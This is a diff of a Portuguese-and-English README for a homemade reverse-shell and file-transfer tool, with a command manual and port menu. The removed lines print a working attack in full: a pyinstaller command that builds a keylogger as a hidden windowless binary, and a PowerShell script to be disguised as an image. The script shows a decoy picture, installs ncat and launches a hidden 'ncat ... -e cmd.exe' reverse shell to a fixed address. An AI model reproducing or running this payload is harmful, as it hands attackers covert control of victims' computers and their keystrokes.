@@ -1,55 +1,37 @@
-#USE O ARQUIVO PYTHON PARA FZER O REVERSE SHELL, SE ESTIVER USANDO O LINUX USE O ARQUIVO "linshell.py"
-SE ESTIVER USANDO O WINDOWS UTILIZE O ARQUIVO "winshell.py", CONFIGURE NO ARQUIVO O EXATO IP E PORTA ONDE
+#USE O ARQUIVO PYTHON PARA FZER O REVERSE SHELL, CONFIGURE NO ARQUIVO O EXATO IP E PORTA ONDE
 ESTARÁ ESCUTANDO NA SUA MAQUINA;
 
 #VOCÊ PODE USAR A OPÇÃO 'help' NO TERMINAL PARA VER ALGUMAS FUNCIONALIDADES DO SCRIPT;
 
-#NA PASTA 'Comunication' VOCÊ VERÁ DOIS ARQUIVOS ONDE O ARQUIVO DO SERVIDOR
-É USADO PARA ESCUTAR E O CLIENT SE CONECTA A ELE, É UM SCRIPT EM FAZE DE TESTES DE APRIMORAMENTO
-PARA FINS EDUCATIVOS;
+##########
 
-#PARA RECEBER OU ENVIAR ARQUIVOS NA SUA MAQUINA OU NO SERVIDOR ONDE ESTÁ O 
-ARQUIVO 'server.py' VOCÊ PODE USAR OS ARQUIVOS 'client.py' E O 'server.py'
-CONFIGURE-OS PARA FAZER A CONEXÃO;
+Manual:
+-[execute] - to execute commands with a message returned for you;
+-[cd] - to change directory;
+-[ls or dir] - to list files;
+-[ipconfig or ifconfig] - to see IP addresses.
+-[Download] - Download mode for files from the server(make shure you are using the client.py file to connect on 8887 port);
+-[Upload] - to upload files from your computer(make shure you are using the server.py listening on 8889 port and the same address).
 
-#QUANDO CONECTADOS O CLIENTE DEVERÁ DIZER O NOME DO ARQUIVO OU PASTA QUE SERÁ 
-ENVIADA DO SERVIDOR COLOQUE O ARQUIVO OU PASTA DESEJADA NA MESMA PASTA ONDE
-O ARQUIVO('server.py') ESTÁ SENDO EXECUTADO.
+##########
 
-To make your keylogger run you need install the pyinstaller 
-and run this comand in your console:
+#NA PASTA "reverse_shell" VOCÊ VERÁ ALGUNS O ARQUIVO "comunication.py"  ELE É O SEU ARQUIVO PARA INICIALIZA O SERVIDOR OU FAZER
+CONEXÃO COM O SERVIDOR ONDE VOCê IRÁ FAZER ENVIO DA PASTA NA QUAL VOCÊ QUER ENVIAR ZIPADA PARA O CLIENTE;
 
+###############
 
-pyinstaller --onefile --noconsole main.py
+MENU PANEL USAGE:
 
-try also hide a script behide a image with a .ps1:
+1. Activate Server on 8887 port;
+2. Activate Client on 8889 port;
+3. Exit
 
-# DEFINE O DIRETÓRIO DO DESKTOP
-$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
+###############
 
-# DEFINE O URL E O CAMINHO DO ARQUIVO DE IMAGEM
-$url2 = "https://www.minitool.com/images/uploads/news/2020/04/system-error-codes-fixes/system-error-codes-fixes-thumbnail.png"
-$filename2 = "picture15322.jpg"
-$finalPath2 = Join-Path -Path $desktopPath -ChildPath $filename2
+Choose: 
 
-# DOWNLOAD A IMAGEM
-Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
-
-# ABRE A IMAGEM
-Start-Process $finalPath2
-# INSTALA O NCAT USANDO O WINGET
-winget install Insecure.Nmap
-
-# AGUARDA A INSTALAÇÃO COMPLETA (OPCIONAL)
-Start-Sleep -Seconds 15
-
-
-
-# DEFINE OS PARÂMETROS PARA O NCAT
-$params = "192.168.1.14 5555 -e cmd.exe"
-
-# EXECUTA O NCAT COM OS PARÂMETROS
-Start-Process -FilePath "ncat" -ArgumentList $params -WindowStyle Hidden
+#QUANDO CONECTADOS O CLIENTE DEVERÁ DIZER O NOME DA PASTA QUE SERÁ 
+ENVIADA DO SERVIDOR, ELE IRÁ EXECUTAR A LÓGICA VERIFICAR SE EXISTE O ARQUIVO E FAZER O ENVIO.
 
 
 
